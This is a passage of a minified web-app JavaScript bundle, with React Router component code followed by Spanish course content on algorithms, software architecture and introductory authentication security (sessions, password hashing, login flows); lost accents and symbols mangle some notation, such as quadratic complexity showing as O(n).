p=="string"&&_x.test(p),G=Ax(p,L);p=G.to;let B=ck(p,{relative:r}),[ee,ue,Q]=Hk(o,A),w=eN(p,{replace:c,state:d,target:f,preventScrollReset:v,relative:r,viewTransition:y,unstable_defaultShouldRevalidate:S,unstable_useTransitions:x});function I(j){e&&e(j),j.defaultPrevented||w(j)}let k=F.createElement("a",{...A,...Q,href:G.absoluteURL||B,onClick:G.isExternal||l?e:I,ref:Wk(R,ue),target:f,"data-discover":!D&&t==="render"?"true":void 0});return ee&&!D?F.createElement(F.Fragment,null,k,F.createElement(Gk,{page:B})):k});Xt.displayName="Link";var Yk=F.forwardRef(function({"aria-current":e="page",caseSensitive:t=!1,className:o="",end:r=!1,style:l,to:c,viewTransition:d,children:f,...p},v){let y=Su(c,{relative:p.relative}),S=Bn(),A=F.useContext(bm),{navigator:R,basename:L}=F.useContext(en),x=A!=null&&iN(y)&&d===!0,D=R.encodeLocation?R.encodeLocation(y).pathname:y.pathname,G=S.pathname,B=A&&A.navigation&&A.navigation.location?A.navigation.location.pathname:null;t||(G=G.toLowerCase(),B=B?B.toLowerCase():null,D=D.toLowerCase()),B&&L&&(B=ti(B,L)||B);const ee=D!=="/"&&D.endsWith("/")?D.length-1:D.length;let ue=G===D||!r&&G.startsWith(D)&&G.charAt(ee)==="/",Q=B!=null&&(B===D||!r&&B.startsWith(D)&&B.charAt(D.length)==="/"),w={isActive:ue,isPending:Q,isTransitioning:x},I=ue?e:void 0,k;typeof o=="function"?k=o(w):k=[o,ue?"active":null,Q?"pending":null,x?"transitioning":null].filter(Boolean).join(" ");let j=typeof l=="function"?l(w):l;return F.createElement(Xt,{...p,"aria-current":I,className:k,ref:v,style:j,to:c,viewTransition:d},typeof f=="function"?f(w):f)});Yk.displayName="NavLink";var Xk=F.forwardRef(({discover:a="render",fetcherKey:e,navigate:t,reloadDocument:o,replace:r,state:l,method:c=Ep,action:d,onSubmit:f,relative:p,preventScrollReset:v,viewTransition:y,unstable_defaultShouldRevalidate:S,...A},R)=>{let{unstable_useTransitions:L}=F.useContext(en),x=nN(),D=oN(d,{relative:p}),G=c.toLowerCase()==="get"?"get":"post",B=typeof d=="string"&&_x.test(d),ee=ue=>{if(f&&f(ue),ue.defaultPrevented)return;ue.preventDefault();let Q=ue.nativeEvent.submitter,w=Q?.getAttribute("formmethod")||c,I=()=>x(Q||ue.currentTarget,{fetcherKey:e,method:w,navigate:t,replace:r,state:l,relative:p,preventScrollReset:v,viewTransition:y,unstable_defaultShouldRevalidate:S});L&&t!==!1?F.startTransition(()=>I()):I()};return F.createElement("form",{ref:R,method:G,action:D,onSubmit:o?f:ee,...A,"data-discover":!B&&a==="render"?"true":void 0})});Xk.displayName="Form";function Zk(a){return`${a} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function kx(a){let e=F.useContext(vl);return Ia(e,Zk(a)),e}function eN(a,{target:e,replace:t,state:o,preventScrollReset:r,relative:l,viewTransition:c,unstable_defaultShouldRevalidate:d,unstable_useTransitions:f}={}){let p=ir(),v=Bn(),y=Su(a,{relative:l});return F.useCallback(S=>{if(Ik(S,e)){S.preventDefault();let A=t!==void 0?t:ru(v)===ru(y),R=()=>p(a,{replace:A,state:o,preventScrollReset:r,relative:l,viewTransition:c,unstable_defaultShouldRevalidate:d});f?F.startTransition(()=>R()):R()}},[v,p,y,t,o,e,a,r,l,c,d,f])}var aN=0,tN=()=>`__${String(++aN)}__`;function nN(){let{router:a}=kx("useSubmit"),{basename:e}=F.useContext(en),t=Sk(),o=a.fetch,r=a.navigate;return F.useCallback(async(l,c={})=>{let{action:d,method:f,encType:p,formData:v,body:y}=Mk(l,e);if(c.navigate===!1){let S=c.fetcherKey||tN();await o(S,t,c.action||d,{unstable_defaultShouldRevalidate:c.unstable_defaultShouldRevalidate,preventScrollReset:c.preventScrollReset,formData:v,body:y,formMethod:c.method||f,formEncType:c.encType||p,flushSync:c.flushSync})}else await r(c.action||d,{unstable_defaultShouldRevalidate:c.unstable_defaultShouldRevalidate,preventScrollReset:c.preventScrollReset,formData:v,body:y,formMethod:c.method||f,formEncType:c.encType||p,replace:c.replace,state:c.state,fromRouteId:t,flushSync:c.flushSync,viewTransition:c.viewTransition})},[o,r,e,t])}function oN(a,{relative:e}={}){let{basename:t}=F.useContext(en),o=F.useContext(Un);Ia(o,"useFormAction must be used inside a RouteContext");let[r]=o.matches.slice(-1),l={...Su(a||".",{relative:e})},c=Bn();if(a==null){l.search=c.search;let d=new URLSearchParams(l.search),f=d.getAll("index");if(f.some(v=>v==="")){d.delete("index"),f.filter(y=>y).forEach(y=>d.append("index",y));let v=d.toString();l.search=v?`?${v}`:""}}return(!a||a===".")&&r.route.index&&(l.search=l.search?l.search.replace(/^\?/,"?index&"):"?index"),t!=="/"&&(l.pathname=l.pathname==="/"?t:Yo([t,l.pathname])),ru(l)}function iN(a,{relative:e}={}){let t=F.useContext(xx);Ia(t!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:o}=kx("useViewTransitionState"),r=Su(a,{relative:e});if(!t.isTransitioning)return!1;let l=ti(t.currentLocation.pathname,o)||t.currentLocation.pathname,c=ti(t.nextLocation.pathname,o)||t.nextLocation.pathname;return Jp(r.pathname,c)!=null||Jp(r.pathname,l)!=null}const Nx={id:"algo-structures",title:"Estructuras de Datos y Algoritmos",description:"El ncleo de la informtica. Aprende a pensar de forma algortmica y a escribir cdigo eficiente que escale a millones de usuarios.",completed:!1,track:"Fundamentos de Ingeniera",lessons:[{id:"algo-01-big-o",title:"Big O Notation: Midiendo la Eficiencia",level:"junior",content:`# Leccin 1: Big O Notation - Profundizando en la Eficiencia

En el desarrollo profesional, no basta con que el cdigo "funcione". Debe ser eficiente. **Big O Notation** es la mtrica estndar para describir cmo escala un algoritmo a medida que aumenta el volumen de datos.

## 1. Los Tres Escenarios
*   **Best Case ( - Omega):** El mejor escenario posible (ej: el elemento buscado es el primero).
*   **Average Case ( - Theta):** El comportamiento esperado en la mayora de las ejecuciones.
*   **Worst Case (O - Big O):** El lmite superior. Este es el que nos importa como ingenieros, porque garantiza que el sistema no colapsar ms all de ese punto.

## 2. Jerarqua de Complejidad (de mejor a peor)
1.  **O(1) - Constante:** Acceso directo (ej: \`myArray[5]\`).
2.  **O(log n) - Logartmica:** Divide el problema a la mitad en cada paso (ej: Bsqueda binaria). Extremadamente escalable.
3.  **O(n) - Lineal:** Un recorrido simple (ej: Encontrar el mximo en una lista desordenada).
4.  **O(n log n) - Cuasi-lineal:** El costo de los ordenamientos eficientes (MergeSort, QuickSort).
5.  **O(n) - Cuadrtica:** Bucles anidados. Prohibido para grandes volmenes de datos.
6.  **O(2) - Exponencial:** El tiempo se duplica con cada nuevo dato (ej: Fibonacci recursivo sin optimizar).

## 3. Trade-off: Tiempo vs Memoria (Space Complexity)
Un algoritmo Senior a veces elige usar ms memoria para ganar velocidad. Por ejemplo, guardar resultados previos en un Hash Table para evitar re-clculos (Memoization).

---

### Misin Junior:
Al analizar un cdigo, ignora las constantes. \`O(2n + 5)\` se simplifica a \`O(n)\`. Lo que importa es la tendencia de crecimiento, no los pasos exactos.
`,completed:!1},{id:"algo-02-arrays-strings",title:"Arrays y Strings: Gestin de Memoria",level:"junior",content:`# Leccin 2: Arrays y Strings - Debajo del Cap

Entender cmo el hardware maneja estas estructuras te permite evitar cuellos de botella de rendimiento.

## 1. El Array en Memoria
Un array es un bloque **contiguo** de memoria. 
*   **Aritmtica de Punteros:** El acceso es O(1) porque la computadora calcula la direccin as: \`Direccin Inicial + (ndice * Tamao del Tipo)\`.
*   **Arrays Dinmicos (List/ArrayList):** Cuando se llenan, el lenguaje crea un array nuevo del doble de tamao y copia todo. Esto es una operacin O(n) "amortizada".

## 2. Strings y la Inmutabilidad
En .NET, Java y JS, los strings son inmutables por seguridad y optimizacin (String Interning).
*   **El peligro:** \`for (i = 0; i < 1000; i++) { s += "a"; } \` crea 1000 objetos en memoria.
*   **La solucin:** Usa clases especficas para construccin de texto (ej: \`StringBuilder\` en C#) que manejan un buffer interno mutable.

---

### Misin Junior:
Investiga qu es un "Value Type" vs un "Reference Type". Un array de enteros se comporta distinto en memoria que un array de objetos complejos.
`,completed:!1},{id:"algo-03-busqueda",title:"Bsqueda de Datos: Algoritmos Fundamentales",level:"junior",content:`# Leccin 3: Bsqueda de Datos y punteros

Encontrar informacin eficientemente es el problema nmero 1 de la informtica.

## 1. Bsqueda Lineal (O(n))
Recorrido secuencial. 
*   **Uso:** Listas pequeas o desordenadas. 
*   **Tip:** Si buscas un elemento que no existe, siempre tardars el mximo tiempo.

## 2. Bsqueda Binaria (O(log n))
Requiere que los datos estn **ordenados**.
\`\`\`javascript
function binarySearch(arr, target) {
    let left = 0, right = arr.length - 1;
    while (left <= right) {
        let mid = Math.floor((left + right) / 2);
        if (arr[mid] === target) return mid;
        if (arr[mid] < target) left = mid + 1;
        else right = mid - 1;
    }
    return -1;
}
\`\`\`

## 3. Tcnica de "Two Pointers"
Muy comn en entrevistas. Usar dos ndices (uno al inicio y otro al final) para recorrer el array en una sola pasada O(n). til para problemas como "Encontrar dos nmeros que sumen X".

---

### Misin Junior:
Implementa la bsqueda binaria de forma recursiva. Es un excelente ejercicio para entender cmo se divide el espacio de bsqueda.
`,completed:!1},{id:"algo-04-ordenamiento",title:"Ordenamiento: Del Caos al Orden",level:"junior",content:`# Leccin 4: Algoritmos de Ordenamiento

Ordenar es la base para poder usar Bsqueda Binaria.

## 1. Algoritmos Simples (O(n))
*   **Bubble Sort:** Lento, pero fcil de entender. Intercambia vecinos.
*   **Selection Sort:** Busca el mnimo y lo mueve al frente. til cuando el nmero de intercambios debe ser mnimo.
*   **Insertion Sort:** Cmo ordenas las cartas en tu mano. Muy rpido para listas casi ordenadas.

## 2. Algoritmos Eficientes (O(n log n))
Los que usas en el mundo real (\`Array.sort()\`).
*   **Merge Sort:** Divide el array en mitades, ordena y combina. Usa memoria extra (O(n)).
*   **Quick Sort:** Elige un "pivote" y organiza elementos menores y mayores. Es el ms rpido en promedio, pero su peor caso es O(n).

---

### Misin Junior:
Por qu no usamos siempre Merge Sort si es O(n log n)? Recuerda el Trade-off: Merge Sort requiere el doble de memoria para funcionar, Quick Sort ordena "in-place" (en el mismo sitio).
`,completed:!1},{id:"algo-05-lineales",title:"Estructuras Lineales Avanzadas",level:"semi-senior",content:`# Leccin 5: Listas Enlazadas, Pilas y Colas Profundo

Cuando la memoria contigua de un array no es suficiente o no conocemos el tamao final.

## 1. Listas Enlazadas (Linked Lists)
*   **Singly Linked:** Nodo -> Siguiente.
*   **Doubly Linked:** Anterior <-> Nodo <-> Siguiente. Permite recorrer en ambas direcciones.
*   **Circular:** El ltimo nodo apunta al primero. til para algoritmos de round-robin (turnos).

## 2. Pilas y Colas Especializadas
*   **Priority Queue:** Los elementos salen por prioridad, no solo por llegada. Fundamental para algoritmos de rutas (Dijkstra).
*   **Deque (Double Ended Queue):** Permite insertar y sacar por ambos extremos.

---

### Misin Semi-Senior:
Implementa una cola usando dos pilas. Es un problema clsico de entrevistas para evaluar tu pensamiento lateral sobre la transferencia de datos.
`,completed:!1},{id:"algo-06-hash-tables",title:"Hash Tables y Resolucin de Colisiones",level:"semi-senior",content:`# Leccin 6: Hash Tables: La anatoma del O(1)

La eficiencia de la Hash Table depende de su **Funcin Hash** y cmo maneja cuando dos llaves caen en el mismo sitio.

## 1. Funciones Hash
Debe ser rpida y distribuir las llaves uniformemente para evitar "clusters".

## 2. Resolucin de Colisiones
*   **Chaining:** Cada casilla del array tiene una Lista Enlazada. Si hay colisin, el nuevo elemento se aade a la lista.
*   **Open Addressing:** Si la casilla est ocupada, busca la siguiente disponible (Linear Probing).

## 3. Factor de Carga (Load Factor)
Cuando la tabla est muy llena (>70%), las colisiones aumentan y el O(1) se degrada a O(n). La tabla debe redimensionarse automticamente.

---

### Misin Semi-Senior:
Por qu no se puede usar un objeto como llave en un diccionario si este es mutable? Si cambias el objeto, su Hash cambia y nunca ms lo encontrars!
`,completed:!1},{id:"algo-07-arboles-recursion",title:"Recursin y Recorridos de rboles",level:"semi-senior",content:`# Leccin 7: Pensamiento Recursivo y rboles

Los rboles requieren una forma de pensar distinta al bucle \`for\` tradicional.

## 1. Anatoma de la Recursin
1.  **Caso Base:** La salida de emergencia.
2.  **Lgica:** Qu hacemos con el dato actual.
3.  **Llamada recursiva:** Reducir el problema.

## 2. Recorridos de rboles (Traversal)
*   **Pre-order (Raz, Izq, Der):** Copiar un rbol.
*   **In-order (Izq, Raz, Der):** Obtiene los elementos ordenados en un BST.
*   **Post-order (Izq, Der, Raz):** Eliminar un rbol (primero las hojas).

---

### Misin Semi-Senior:
Calcula la altura de un rbol binario usando recursin. Pista: La altura es \`1 + max(altura_izq, altura_der)\`.
`,completed:!1},{id:"algo-08-grafos-avanzados",title:"Grafos: Modelando Relaciones",level:"senior",content:`# Leccin 8: Grafos y Algoritmos de Caminos

Un grafo es un conjunto de Vrtices (nodos) y Aristas (conexiones).

## 1. Representacin en Cdigo
*   **Matriz de Adyacencia:** Array 2D. Rpido para saber si A y B estn conectados, pero ocupa mucha memoria O(V).
*   **Lista de Adyacencia:** Array de listas. Ms eficiente en memoria para grafos con pocas conexiones.

## 2. Algoritmos de Bsqueda
*   **BFS (Breadth-First):** Usa una **Cola**. Encuentra el camino ms corto en grafos sin peso.
*   **DFS (Depth-First):** Usa una **Pila** (o recursin). Encuentra ciclos o recorre ramas completas.

## 3. Introduccin a Pesos (Dijkstra)
En un mapa, las conexiones tienen costo (distancia). Dijkstra usa una Priority Queue para expandir siempre el camino ms "barato" acumulado.

---

### Misin Senior:
Implementa la deteccin de ciclos en un grafo dirigido usando DFS. Es vital para detectar dependencias circulares en sistemas de paquetes (como npm o nuget).
`,completed:!1},{id:"algo-09-dp-optimizacion",title:"Programacin Dinmica y Backtracking",level:"senior",content:`# Leccin 9: Maestra en Optimizacin

Las tcnicas para cuando la fuerza bruta tardara milenios.

## 1. Programacin Dinmica (DP)
Es "Recursin con Memoria". 
*   **Memoization (Top-Down):** Agregas un diccionario a tu funcin recursiva para guardar resultados.
*   **Tabulation (Bottom-Up):** Llenas una tabla desde el caso base hasta el objetivo.

## 2. Backtracking: Poda de rboles
Es como resolver un laberinto. Vas por un camino, si chocas con pared, vuelves a la ltima interseccin y pruebas otra ruta.
*   Clave: "Podar" ramas que sabes que no llevan a la solucin para ahorrar tiempo.

## 3. Optimizacin de Bajo Nivel
Un Senior entiende que \`O(n)\` recorriendo memoria de forma saltada es ms lento que \`O(n)\` recorriendo memoria de forma lineal debido al **L1/L2 Cache** de la CPU.

---

### Misin Senior:
Resuelve el problema de Fibonacci usando los tres enfoques: Recursivo simple (O(2)), Memoization (O(n)) y Tabulation con espacio optimizado (O(n) tiempo, O(1) espacio). Mira la diferencia abismal de rendimiento.
`,completed:!1},{id:"algo-10-entrevistas",title:"Dominando la Entrevista Tcnica y LeetCode",level:"senior",content:`# Leccin 10: Dominando la Entrevista Tcnica (LeetCode Style)

Saber programar no es lo mismo que saber pasar una entrevista tcnica. Aqu se evala tu capacidad de **resolucin de problemas bajo presin** y tu **comunicacin**.

## 1. El Framework de Resolucin (4 Pasos)
No empieces a escribir cdigo de inmediato. Eso es una "red flag".
1.  **Entender (Understand):** Haz preguntas. Los nmeros pueden ser negativos? El array est ordenado? Puede haber duplicados? Define los "Edge Cases".
2.  **Planear (Plan):** Explica tu enfoque en voz alta. "Podra usar fuerza bruta, pero sera O(n). Mejor usar un Hash Map para hacerlo en O(n)".
3.  **Codificar (Code):** Escribe cdigo limpio. Usa nombres de variables descriptivos, no \`x\` o \`y\`.
4.  **Optimizar (Optimize):** Analiza la complejidad Big O de tu solucin y sugiere mejoras.

## 2. Patrones Comunes (La clave del xito)
Casi todos los problemas de LeetCode caen en una de estas categoras:
*   **Two Pointers:** Para arrays ordenados o palndromos.
*   **Sliding Window:** Para sub-arrays o sub-strings contiguos.
*   **Hash Maps:** Para frecuencias o bsquedas rpidas (O(1)).
*   **Fast & Slow Pointers:** Para detectar ciclos en Linked Lists.

## 3. Ejemplo Real: Two Sum
**Problema:** Dado un array de enteros \`nums\` y un entero \`target\`, devuelve los ndices de los dos nmeros que suman \`target\`.

### Enfoque 1: Fuerza Bruta (No recomendado)
\`\`\`javascript
// O(n) - Demasiado lento
for(let i=0; i<nums.length; i++) {
    for(let j=i+1; j<nums.length; j++) {
        if(nums[i] + nums[j] === target) return [i, j];
    }
}
\`\`\`

### Enfoque 2: Hash Map (Profesional)
\`\`\`javascript
// O(n) - Eficiente
const map = new Map();
for(let i=0; i<nums.length; i++) {
    const complemento = target - nums[i];
    if(map.has(complemento)) return [map.get(complemento), i];
    map.set(nums[i], i);
}
\`\`\`

## 4. Errores Comunes
*   **Programacin Silenciosa:** El entrevistador necesita escuchar tu tren de pensamiento.
*   **Ignorar Edge Cases:** Qu pasa si el input es null? O vaco?
*   **Optimizacin Prematura:** Empieza con una solucin que funcione, luego optimiza. No te bloquees buscando la solucin perfecta desde el segundo 0.

---

### Misin Senior:
Resuelve el problema "Valid Parentheses" (LeetCode #20) usando una **Pila (Stack)**. Es el ejemplo perfecto para demostrar por qu entender las estructuras de datos es ms importante que memorizar cdigo.
`,completed:!1}]},Ox={id:"architecture",title:"Arquitectura de Software",description:"De monolitos a microservicios. Aprende a disear sistemas escalables, mantenibles y resilientes.",completed:!1,lessons:[{id:"arch-01",title:"Principios Fundamentales",description:"Conceptos bsicos de diseo de sistemas y patrones arquitectnicos.",content:`
# Fundamentos de Arquitectura

La arquitectura de software no se trata de elegir lenguajes, sino de tomar decisiones sobre la estructura del sistema que son difciles de cambiar ms tarde.

### 1. El Teorema CAP
En sistemas distribuidos, solo puedes garantizar 2 de estas 3 propiedades:
*   **Consistencia**: Todos los nodos ven los mismos datos al mismo tiempo.
*   **Disponibilidad**: Cada peticin recibe una respuesta (sin garanta de que sea la ms reciente).
*   **Particin**: El sistema sigue funcionando a pesar de fallos de red.

### 2. Trade-offs
"There are no silver bullets, only trade-offs." Cada solucin arquitectnica resuelve un problema pero introduce otros. El trabajo del arquitecto es elegir el "veneno" que puede manejar.

### 3. Deuda Tcnica
La decisin consciente de tomar un atajo hoy para entregar valor rpido, sabiendo que habr que "pagarlo" (refactorizar) maana.
            `,level:"junior",completed:!1},{id:"arch-02",title:"Clean Architecture",description:"Diseando sistemas independientes de frameworks y bases de datos.",content:`
# Clean Architecture (Arquitectura Limpia)

Popularizada por Robert C. Martin (Uncle Bob), busca separar las reglas de negocio de los detalles tcnicos.

### Las Capas
1.  **Entidades**: Reglas de negocio crticas.
2.  **Casos de Uso**: Lgica especfica de la aplicacin.
3.  **Adaptadores de Interfaz**: Controladores, Presenters, Gateways.
4.  **Frameworks & Drivers**: DB, UI, Web Frameworks.

### La Regla de Dependencia
Las dependencias siempre deben apuntar hacia **adentro**. Las capas internas no saben nada de las externas. Esto permite cambiar una base de datos SQL por una NoSQL sin tocar una sola lnea de lgica de negocio.
            `,level:"semisenior",completed:!1},{id:"arch-03",title:"Microservicios y Event-Driven",description:"Escalabilidad horizontal y comunicacin asncrona entre servicios.",content:`
# Arquitecturas Modernas

### Monolitos vs Microservicios
Un monolito es ms fcil de desplegar y testear al inicio. Los microservicios brillan cuando el equipo crece y necesitas escalabilidad independiente.

### Event-Driven Design
En lugar de llamadas directas (HTTP), los servicios se comunican a travs de eventos (Kafka, RabbitMQ, Redis).
*   **Ventaja**: Desacoplamiento total. El Servicio A no necesita que el Servicio B est "vivo" para emitir un evento.
*   **Reto**: Consistencia eventual. El sistema no se sincroniza al instante, sino "con el tiempo".
            `,level:"senior",completed:!1},{id:"arch-project",title:"Proyecto: Diseo de Sistema Global",description:"Disea la arquitectura para una red social con millones de usuarios concurrentes.",content:`
# Reto de Arquitectura Senior

### El Escenario
Debes disear una plataforma estilo "Twitter/X" que soporte:
*   100k tweets por segundo.
*   Timeline generado en tiempo real.
*   Alta disponibilidad global.

### Requerimientos de Entrega
1.  Diagrama de servicios (Load Balancers, API Gateway, Microservices).
2.  Estrategia de base de datos (Sharding, Read Replicas).
3.  Capa de Cach (Redis/Memcached).
4.  Manejo de picos de trfico (Colas de mensajes).

**Sugerencia**: Usa el mtodo C4 para documentar tu arquitectura.
            `,level:"senior",completed:!1,isProject:!0}]},zx={id:"auth-security",title:"Autenticacin y Seguridad",description:"Aprende a proteger tus aplicaciones, gestionar usuarios y sesiones de forma segura.",completed:!1,lessons:[{id:"auth-security-01-authn-vs-authz",title:"Qu es autenticacin y autorizacin?",level:"junior",content:`# Leccin 1: Qu es autenticacin y autorizacin?

Muchas personas usan estos trminos como si fueran lo mismo, pero en seguridad web, confundirlos es el primer paso hacia un agujero de seguridad. Vamos a separarlos con claridad quirrgica.

## 1. Autenticacin (Authentication / AuthN)
La autenticacin es el proceso de **verificar quin eres**. Es la respuesta a la pregunta: Eres quien dices ser?

**La analoga del pasaporte:**
Cuando llegas a la frontera de un pas y muestras tu pasaporte, el oficial de migracin mira tu foto, los sellos de seguridad y tu cara. Si todo coincide, l confirma que t eres, efectivamente, la persona que figura en el documento. **Eso es autenticacin.**

En la web, esto suele ser:
*   Email y contrasea.
*   Cdigo enviado al celular (2FA).
*   Huella digital o reconocimiento facial.

## 2. Autorizacin (Authorization / AuthZ)
La autorizacin es el proceso de **verificar qu tienes permitido hacer**. Ocurre *despus* de que ya sabemos quin eres. Es la respuesta a la pregunta: Tienes permiso para entrar aqu o tocar esto?

**La analoga de la discoteca:**
Ya pasaste la puerta (ests autenticado). Ahora quieres entrar al rea VIP. El guardia de esa zona revisa tu pulsera. Si no la tienes, no pasas, aunque seas un cliente legtimo del lugar. **Eso es autorizacin.**

En la web, esto suele ser:
*   Este usuario es administrador?
*   Este usuario es el dueo de este post para poder borrarlo?
*   Este usuario pag la suscripcin Premium para ver este video?

## 3. El flujo lgico
Nunca puedes autorizar a alguien que no ha sido autenticado primero (a menos que sea un "Invitado", pero incluso ah hay una identidad annima).

1.  **Identificacin:** El usuario dice "Soy Juan".
2.  **Autenticacin:** El sistema pide pruebas ("Dame tu clave, Juan").
3.  **Autorizacin:** El sistema revisa su base de datos ("Juan est autenticado, tiene permiso de Admin? No. Entonces no puede borrar la base de datos").

## 4. Error Comn: Confiar por defecto
Un error de Junior es pensar: *"Si el usuario ya entr a la app con su login, puede hacer todo"*. 
**No.** Siempre debes validar la autorizacin en cada peticin sensible. Que alguien haya entrado a tu casa no significa que deba tener la llave de tu caja fuerte.

---

### Ejercicio Prctico 1:
Analiza estas situaciones y clasifcalas como **Autenticacin** o **Autorizacin**:
1.  Ingresar el cdigo de 6 dgitos que te lleg por SMS.
2.  Intentar entrar al panel de control de un sitio y recibir un mensaje de "Acceso Denegado: Solo para editores".
3.  Poner tu huella digital para desbloquear el celular.
4.  Intentar editar un comentario de otro usuario en un foro y que el botn de "Editar" no aparezca.

*Reflexiona: Por qu es peligroso que un programador olvide la Autorizacin despus de haber hecho un Login exitoso?*
`,completed:!1},{id:"auth-security-02-usuarios-y-sesiones",title:"Usuarios y sesiones",level:"junior",content:`# Leccin 2: Usuarios y sesiones

Para la web, cada vez que haces clic en un link o pides una imagen, es como si fuera la primera vez que te ve. HTTP es un protocolo **"stateless" (sin estado)**. No guarda memoria entre una peticin y la siguiente.

Cmo es que Facebook no te pide la contrasea cada vez que das un "Like"? La respuesta son las **Sesiones**.

## 1. El problema de la amnesia de HTTP
Imagina que vas a un caf. Pides un caf y lo pagas. Luego pides una factura. El mozo te mira raro y te pregunta: "Quin eres? Me pagaste?". Tienes que volver a demostrarle todo. Eso es HTTP sin sesiones.

## 2. Qu es una Sesin?
Una sesin es una forma de mantener el estado del usuario a travs de mltiples peticiones. 

**Cmo funciona (El ticket de guardarropa):**
1.  **Login:** Envas tu usuario y clave al servidor.
2.  **Creacin:** El servidor verifica que eres t y crea una "Sesin" en su memoria (o base de datos). A esa sesin le asigna un ID nico y secreto (ej: \`sess_12345abc\`).
3.  **El Ticket:** El servidor te responde envindote ese ID.
4.  **Memoria:** En cada siguiente peticin, tu navegador enva automticamente ese ID. El servidor lo mira, busca en su memoria y dice: "Ah, es la sesin \`sess_12345abc\`, que pertenece a Juan. Bienvenido de nuevo, Juan".

## 3. Almacenamiento de sesiones en el servidor
Dnde guarda el servidor esta informacin?
*   **Memoria RAM:** Rpido, pero si el servidor se reinicia, todos los usuarios se desloguean. Adems, no funciona bien si tienes varios servidores (balanceo de carga).
*   **Base de Datos (SQL):** Persistente, pero puede ser lento si tienes miles de usuarios pidiendo cosas al mismo tiempo.
*   **Redis (Memoria en cach):** El estndar de la industria. Es ultra rpido y persiste aunque reinicies la app principal.

## 4. El peligro del secuestro de sesin (Session Hijacking)
Si alguien te roba tu \`Session ID\`, esa persona **ES T** para el servidor. No necesita tu contrasea, solo necesita tu ID de sesin. Por eso, estos IDs deben viajar siempre por canales seguros (HTTPS) y estar protegidos.

---

### Ejemplo Real:
Cuando cierras sesin en una pgina, lo que realmente est pasando es que:
1.  El servidor borra el registro de ese ID de su base de datos/memoria.
2.  El navegador borra el ID de su almacenamiento.
A partir de ah, el ID queda invalidado. Si alguien intenta usarlo, el servidor dir: "No reconozco este ticket".

### Ejercicio Mental 2:
Si un sitio web guarda las sesiones solo en la memoria RAM del servidor y el programador decide actualizar el cdigo y reiniciar el servidor a las 3:00 PM:
1.  Qu les pasar a los usuarios que estaban navegando en ese momento?
2.  Cmo podras evitar este problema sin dejar de usar sesiones?
`,completed:!1},{id:"auth-security-03-passwords-y-hashing",title:"Passwords y hashing (El arte de no guardar secretos)",level:"junior",content:`# Leccin 3: Passwords y hashing (El arte de no guardar secretos)

Si hay una regla de oro en seguridad es esta: **NUNCA guardes contraseas en texto plano en tu base de datos.** Ni siquiera "encriptadas". Debes guardarlas usando **Hashing**.

## 1. Por qu el texto plano es el final de tu carrera?
Si guardas \`password: "messi123"\` y un hacker entra a tu base de datos, tiene las llaves de todos tus usuarios. Pero hay algo peor: la gente suele usar la misma clave para todo. Si el hacker tiene su clave de tu app de perritos, probablemente tenga su clave de Gmail y de su banco. Seras responsable de una catstrofe.

## 2. Hashing vs Encriptacin
*   **Encriptacin (Simtrica/Asimtrica):** Es de dos vas. Bloqueas un mensaje con una llave y puedes desbloquearlo para leer el original.
*   **Hashing:** Es de **UNA SOLA VA**. Pasas un texto por una funcin matemtica y sale una cadena de caracteres (el "hash"). Es imposible (en teora) volver del hash al texto original.

**Analoga del Licuado:**
El hashing es como meter una banana, una manzana y leche en una licuadora. Obtienes un licuado. Mirando el licuado puedes saber qu tiene, pero no puedes "des-licuarlo" para recuperar la banana entera.

## 3. Cmo verificamos el login entonces?
Si no podemos ver la clave original... cmo sabemos si es correcta?
1.  El usuario se registra con \`messi123\`.
2.  Tu servidor lo pasa por la funcin de hash: \`hash("messi123")\` -> \`a7b2...\`.
3.  Guardas \`a7b2...\` en la base de datos.
4.  Cuando el usuario hace login, escribe \`messi123\`.
5.  Tu servidor hace: \`hash("messi123")\`. Si el resultado es \`a7b2...\`, quiere decir que escribi la clave correcta. **Eureka!**

## 4. Salt (Sal): Evitando las tablas de hackers
Los hackers tienen "Rainbow Tables" (tablas con millones de hashes ya calculados de palabras comunes). Si tu hash es \`a7b2...\`, ellos ya saben que eso significa \`password\`.

Para evitar esto usamos el **Salt**: un pedazo de texto aleatorio que se le suma a la clave antes de licuarla.
\`hash("messi123" + "SAL_ALEATORIA_99")\` -> Ahora el resultado es totalmente diferente e imposible de predecir.

## 5. Algoritmos recomendados
*   **MD5 / SHA1:** PROHIBIDOS! Son viejos y muy fciles de romper.
*   **BCrypt:** El estndar confiable. Es lento a propsito para que a un hacker le cueste aos probar millones de combinaciones.
*   **Argon2:** El ganador de las competiciones de hashing actuales. Es el ms seguro hoy en da.

---

### Error de Junior:
Intentar crear tu propio algoritmo de hashing. No lo hagas. Usa libreras probadas como \`bcryptjs\` o las nativas de tu lenguaje.

### Ejercicio Mental 3:
Si un hacker roba tu base de datos y todas las contraseas estn hasheadas con BCrypt y un buen Salt:
1.  Puede el hacker entrar a las cuentas de los usuarios inmediatamente?
2.  Qu tendra que hacer para intentar descubrir una clave?
3.  Por qu es importante que el proceso de hashing sea "lento"?
`,completed:!1},{id:"auth-security-04-login-y-registro",title:"Login y registro (El flujo completo)",level:"junior",content:`# Leccin 4: Login y registro (El flujo completo)

Ya entendemos la teora. Ahora miremos cmo se ve el proceso real desde que el usuario completa un formulario hasta que entra a tu aplicacin.

## 1. El Proceso de Registro (Sign Up)
1.  **Frontend:** El usuario enva su Email y Contrasea.
2.  **Validacin:** El servidor revisa que el email sea vlido y la contrasea tenga el largo necesario (ej: min 8 caracteres).
3.  **Verificacin de Existencia:** El servidor busca en la base de datos si ya existe un usuario con ese email. Si existe, devuelve un error.
4.  **Hashing:** Se genera un Salt y se hashea la clave.
5.  **Persistencia:** Se guarda el nuevo usuario con la clave hasheada.
6.  **Respuesta:** "Registro exitoso". Podras loguearlo automticamente o pedirle que confirme su email.

## 2. El Proceso de Login (Sign In)
1.  **Frontend:** Enva Email y Contrasea.
2.  **Bsqueda:** El servidor busca al usuario por su email.
3.  **Comparacin:** 
    *   Si no existe el usuario -> Error.
    *   Si existe, comparamos la clave enviada con el hash guardado (usando la funcin \`compare\` de la librera de hashing).
4.  **Creacin de Estado:** Si coinciden, generamos una **Sesin** o un **Token** (veremos tokens ms adelante).
5.  **Respuesta:** Enviamos el ID de sesin o token al cliente.

## 3. Seguridad en los Mensajes de Error (Importante!)
Este es un error clsico. 
*   **MAL:** "El usuario no existe" o "Contrasea incorrecta".
*   **BIEN:** "Email o contrasea invlidos".

